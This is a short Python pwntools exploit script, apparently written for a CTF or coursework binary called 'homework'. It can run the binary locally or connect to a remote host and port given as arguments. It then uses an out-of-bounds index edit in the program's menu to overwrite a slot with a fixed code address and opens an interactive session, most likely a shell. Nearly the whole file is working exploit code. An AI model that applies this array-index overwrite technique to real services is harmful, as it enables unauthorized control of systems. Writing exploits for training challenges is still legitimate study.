from pwn import *
import sys
context.log_level = "debug"
# context.terminal = ["tmux", "splitw", "-h"]
def one_gadget(filename: str) -> list:
    return [
        int(i) for i in __import__('subprocess').check_output(
            ['one_gadget', '--raw', filename]).decode().split(' ')
    ]

if len(sys.argv) == 1:
    r = process("./homework")
    # if args.GDB:
    gdb.attach(r)
elif len(sys.argv) == 3:
    r = remote(sys.argv[1], sys.argv[2])
else:
    sys._exit(1)
r.sendlineafter(b"What's your name?",b"ooo")
# for i in range(11,20):
#     r.recvuntil(b'dump all numbers')
#     r.sendlineafter(b" >",b"1")
#     r.sendlineafter(b"Index to edit: ",str(i))
#     r.sendlineafter(b"How many? ", str(i))
# Invalid address 0xe
r.recvuntil(b'dump all numbers')
r.sendlineafter(b" >",b"1")
r.sendlineafter(b"Index to edit: ",b"14")
r.sendlineafter(b"How many? ", str(0x080485fb))
r.recvuntil(b'dump all numbers')
r.sendlineafter(b" >",b"0")
r.interactive()